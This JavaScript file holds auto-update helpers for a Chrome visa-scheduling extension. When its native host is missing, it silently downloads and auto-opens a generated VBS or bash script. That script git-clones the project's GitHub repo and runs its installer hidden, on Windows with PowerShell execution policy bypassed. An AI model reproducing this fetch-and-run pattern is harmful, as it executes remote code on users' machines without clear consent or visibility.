// GitHub auto-update helpers (imported by background.js)
// Reload ONLY when git actually changes files — never loop on version mismatch alone.

const GITHUB_REPO = 'SatnamSinghToor/SardarJi-Visa-Scheduler';
const GITHUB_MANIFEST_URL =
  'https://raw.githubusercontent.com/' + GITHUB_REPO + '/main/manifest.json';
const NATIVE_HOST = 'com.sardarji.updater';
const BOOTSTRAP_RETRY_MS = 60 * 1000;
const RELOAD_COOLDOWN_MS = 2 * 60 * 1000;

function parseVersion(v) {
  return String(v || '0').split('.').map(function(n) { return parseInt(n, 10) || 0; });
}

function compareVersion(a, b) {
  var pa = parseVersion(a);
  var pb = parseVersion(b);
  var len = Math.max(pa.length, pb.length);
  for (var i = 0; i < len; i++) {
    var da = pa[i] || 0;
    var db = pb[i] || 0;
    if (da > db) return 1;
    if (da < db) return -1;
  }
  return 0;
}

function delay(ms) {
  return new Promise(function(resolve) { setTimeout(resolve, ms); });
}

function fetchRemoteVersion() {
  return fetch(GITHUB_MANIFEST_URL, { cache: 'no-store' })
    .then(function(r) {
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return r.json();
    })
    .then(function(data) { return data && data.version ? data.version : null; });
}

function canReloadNow(targetVersion) {
  return new Promise(function(resolve) {
    chrome.storage.local.get(['lastReloadAt', 'lastReloadForVersion'], function(d) {
      var now = Date.now();
      if (d.lastReloadForVersion === targetVersion) {
        resolve(false);
        return;
      }
      if (d.lastReloadAt && now - d.lastReloadAt < RELOAD_COOLDOWN_MS) {
        resolve(false);
        return;
      }
      resolve(true);
    });
  });
}

function markReloadDone(targetVersion) {
  chrome.storage.local.set({
    lastReloadAt: Date.now(),
    lastReloadForVersion: targetVersion
  });
}

function tryNativePing() {
  return new Promise(function(resolve) {
    chrome.runtime.sendNativeMessage(NATIVE_HOST, { action: 'ping' }, function(resp) {
      resolve(!chrome.runtime.lastError && resp && resp.success);
    });
  });
}

function tryNativeGitHubSync() {
  return new Promise(function(resolve) {
    chrome.runtime.sendNativeMessage(NATIVE_HOST, { action: 'update' }, function(resp) {
      if (chrome.runtime.lastError) {
        resolve({ ok: false, reason: chrome.runtime.lastError.message });
        return;
      }
      resolve({ ok: true, resp: resp || {} });
    });
  });
}

function bootstrapScriptForPlatform(os) {
  var cloneUrl = 'https://github.com/' + GITHUB_REPO + '.git';

  if (os === 'win') {
    return [
      'Set sh = CreateObject("Wscript.Shell")',
      'repo = CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\\SardarJi-Visa-Scheduler"',
      'Set fs = CreateObject("Scripting.FileSystemObject")',
      'If Not fs.FileExists(repo & "\\native-host\\install.ps1") Then',
      '  sh.Run "git clone ' + cloneUrl + ' "" & repo & """", 0, True',
      'End If',
      'sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "" & repo & "\\native-host\\install.ps1""", 0, True'
    ].join('\r\n');
  }

  return [
    '#!/bin/bash',
    'REPO="$HOME/SardarJi-Visa-Scheduler"',
    'if [ ! -f "$REPO/native-host/install.sh" ]; then',
    '  git clone ' + cloneUrl + ' "$REPO"',
    'fi',
    'bash "$REPO/native-host/install.sh" </dev/null >/dev/null 2>&1 &'
  ].join('\n');
}

function bootstrapFilename(os) {
  if (os === 'win') return 'SardarJi-Setup.vbs';
  if (os === 'mac') return 'SardarJi-Setup.command';
  return 'SardarJi-Setup.sh';
}

function shouldRetryBootstrap() {
  return new Promise(function(resolve) {
    chrome.storage.local.get(['lastBootstrapAt'], function(d) {
      var last = d.lastBootstrapAt || 0;
      resolve(Date.now() - last >= BOOTSTRAP_RETRY_MS);
    });
  });
}

function markBootstrapAttempt() {
  chrome.storage.local.set({ lastBootstrapAt: Date.now() });
}

function contentToDataUrl(text) {
  var bytes = new TextEncoder().encode(text);
  var binary = '';
  for (var i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return 'data:application/octet-stream;base64,' + btoa(binary);
}

function downloadAndLaunchBootstrap() {
  return new Promise(function(resolve) {
    chrome.runtime.getPlatformInfo(function(info) {
      var os = info && info.os ? info.os : 'win';
      var dataUrl = contentToDataUrl(bootstrapScriptForPlatform(os));

      chrome.downloads.download({
        url: dataUrl,
        filename: bootstrapFilename(os),
        conflictAction: 'overwrite',
        saveAs: false
      }, function(downloadId) {
        if (chrome.runtime.lastError || !downloadId) {
          resolve(false);
          return;
        }

        function onChanged(delta) {
          if (delta.id !== downloadId || !delta.state) return;
          if (delta.state.current === 'complete') {
            chrome.downloads.onChanged.removeListener(onChanged);
            chrome.downloads.open(downloadId);
            resolve(true);
          } else if (delta.state.current === 'interrupted') {
            chrome.downloads.onChanged.removeListener(onChanged);
            resolve(false);
          }
        }

        chrome.downloads.onChanged.addListener(onChanged);
      });
    });
  });
}

function ensureNativeHostReady() {
  return tryNativePing().then(function(ready) {
    if (ready) return true;

    return shouldRetryBootstrap().then(function(canRetry) {
      if (!canRetry) return false;
      markBootstrapAttempt();
      return downloadAndLaunchBootstrap().then(function(launched) {
        if (!launched) return false;
        return delay(4000).then(function() { return tryNativePing(); });
      });
    });
  });
}

function forceExtensionReload(reason, targetVersion) {
  return canReloadNow(targetVersion).then(function(allow) {
    if (!allow) return false;
    markReloadDone(targetVersion);
    if (typeof addLog === 'function') {
      addLog(reason || 'Reloading extension...');
    }
    setTimeout(function() { chrome.runtime.reload(); }, 400);
    return true;
  });
}

function syncFromGitHubAndMaybeReload(localVersion) {
  return ensureNativeHostReady()
    .then(function() { return tryNativeGitHubSync(); })
    .then(function(native) {
      if (!native.ok || !native.resp || !native.resp.success) {
        return false;
      }

      var r = native.resp;
      if (!r.changed) {
        return false;
      }

      var newVer = r.version || localVersion;
      if (typeof addLog === 'function') {
        addLog('GitHub sync complete (v' + newVer + ').');
      }
      return forceExtensionReload('Updated to v' + newVer + ' — reloading...', newVer);
    });
}

// Sidebar open only — skip while monitoring is active.
function trySidebarUpdateCheck() {
  return new Promise(function(resolve) {
    chrome.storage.local.get(['monitoring'], function(d) {
      if (d.monitoring) {
        resolve(false);
        return;
      }

      var localVersion = chrome.runtime.getManifest().version;
      fetchRemoteVersion()
        .then(function(remoteVersion) {
          if (!remoteVersion) return false;
          if (compareVersion(remoteVersion, localVersion) > 0 && typeof addLog === 'function') {
            addLog('GitHub has v' + remoteVersion + ' (running v' + localVersion + ') — syncing...');
          }
          return syncFromGitHubAndMaybeReload(localVersion);
        })
        .then(resolve)
        .catch(function(err) {
          if (typeof addLog === 'function') {
            addLog('Update check failed: ' + (err && err.message ? err.message : 'network error'));
          }
          resolve(false);
        });
    });
  });
}